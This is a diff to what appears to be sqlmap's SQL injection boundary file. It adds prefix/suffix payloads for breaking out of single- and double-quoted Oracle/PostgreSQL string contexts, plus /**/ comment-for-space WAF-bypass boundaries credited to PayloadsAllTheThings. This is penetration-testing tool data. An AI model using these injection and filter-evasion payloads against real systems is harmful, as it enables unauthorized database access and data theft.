@@ -389,12 +389,22 @@ Formats:
 
     <!-- Ghauri-style: break out of string and concatenate (Oracle time-based bypass) -->
     <boundary>
-        <level>2</level>
+        <level>0</level>
         <clause>1,9</clause>
         <where>1</where>
         <ptype>2</ptype>
         <prefix>'||</prefix>
         <suffix>||'</suffix>
+    </boundary>
+
+    <!-- Ghauri-style: double-quoted string context (Oracle, PostgreSQL) -->
+    <boundary>
+        <level>0</level>
+        <clause>1,9</clause>
+        <where>1</where>
+        <ptype>4</ptype>
+        <prefix>"||</prefix>
+        <suffix>||"</suffix>
     </boundary>
 
     <boundary>
@@ -583,4 +593,22 @@ Formats:
         <suffix>#</suffix>
     </boundary>
     <!-- End of AGAINST boolean full-text search boundaries -->
+
+    <!-- PayloadsAllTheThings: WAF Bypass - No Space (uses /**/ instead of spaces) -->
+    <boundary>
+        <level>5</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>1</ptype>
+        <prefix>)/**/AND/**/(</prefix>
+        <suffix>)/**/</suffix>
+    </boundary>
+    <boundary>
+        <level>5</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>2</ptype>
+        <prefix>'/**/AND/**/</prefix>
+        <suffix>/**/AND/**/'[RANDSTR]'='[RANDSTR]</suffix>
+    </boundary>
 </root>
